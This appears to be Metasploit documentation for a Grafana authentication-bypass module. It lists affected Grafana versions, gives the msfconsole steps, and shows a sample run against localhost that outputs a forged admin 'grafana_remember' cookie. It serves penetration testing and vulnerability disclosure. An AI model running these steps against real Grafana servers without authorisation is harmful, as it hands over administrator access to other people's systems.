## Vulnerable Application

The following list is a list of vulnerable versions of Grafana:

  1.  2.x 
  2.  3.x
  3.  4.x befroe 4.6.4
  4.  5.x before 5.2.3

## Verification Steps

  1. Start msfconsole
  2. Do: ```use auxiliary/admin/http/grafana_auth_bypass```
  3. Do: ``set username <username>`` or ``set cookie <cookie>`` 
  5. Do: ``set version``
    5. Do: ``run``

## Scenarios

  Example run against Grafana 3.x with username admin:

```
msf5 > use auxiliary/admin/http/grafana_auth_bypass 
msf5 auxiliary(admin/http/grafana_auth_bypass) > set username admin
username => admin
msf5 auxiliary(admin/http/grafana_auth_bypass) > set version 3
version => 3
msf5 auxiliary(admin/http/grafana_auth_bypass) > run

[*] Running for 127.0.0.1...
[*] Delete the session cookie and set the following
[+] grafana_user: admin
[+] grafana_remember: 04bb669b935fa628795de56f2eb96c5a0f426b849285bdda46ec5f3e5b4f311e9b
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```
